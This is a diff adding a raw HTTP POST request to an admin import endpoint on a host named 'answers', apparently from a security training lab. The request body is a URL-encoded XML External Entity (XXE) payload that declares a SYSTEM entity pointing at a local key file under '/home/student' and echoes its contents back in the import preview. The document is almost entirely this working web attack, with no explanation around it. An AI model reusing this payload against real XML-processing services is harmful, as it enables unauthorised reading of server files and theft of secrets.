@@ -1,0 +1,15 @@
+POST /admin/import HTTP/1.1
+Host: answers
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate, br
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 263
+Origin: http://answers
+Connection: close
+Referer: http://answers/admin/import
+Cookie: JSESSIONID=0474EC86D3802ADE51ABB3D1AA53AA0C
+Upgrade-Insecure-Requests: 1
+
+preview=true&xmldata=%3C%21--%3Fxml+version%3D%221.0%22+%3F--%3E%0D%0A%3C%21DOCTYPE+foo+%5B%3C%21ENTITY+example+SYSTEM+%22%2Fhome%2Fstudent%2FadminKeytxt%22%3E+%5D%3E%0D%0A%3Cdatabase%3E%0D%0A%3Ctest%3E%0D%0A%26example%3B%0D%0A%3C%2Ftest%3E%0D%0A%3C%2Fdatabase%3E
